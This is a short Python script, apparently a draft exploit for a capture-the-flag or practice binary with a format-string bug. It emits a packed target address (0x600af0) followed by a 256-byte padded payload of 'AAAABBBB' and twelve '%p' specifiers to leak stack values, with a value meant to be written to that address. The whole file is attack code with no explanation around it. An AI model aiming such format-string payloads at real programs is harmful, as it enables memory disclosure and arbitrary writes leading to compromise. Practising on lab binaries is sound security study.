import struct
import sys

def pad(s):
    return s + "X"*(256-len(s))

what_to_write = 0x64457845
where_to_write = 0x600af0

bytesdata = b"\xf0\x0a\x60\x00\x00\x00\x00\x00"
#exploit += struct.pack("q", where_to_write).decode()
exploit = 'AAAABBBB'
exploit += '%p'*12

sys.stdout.buffer.write(bytesdata)
print(pad(exploit))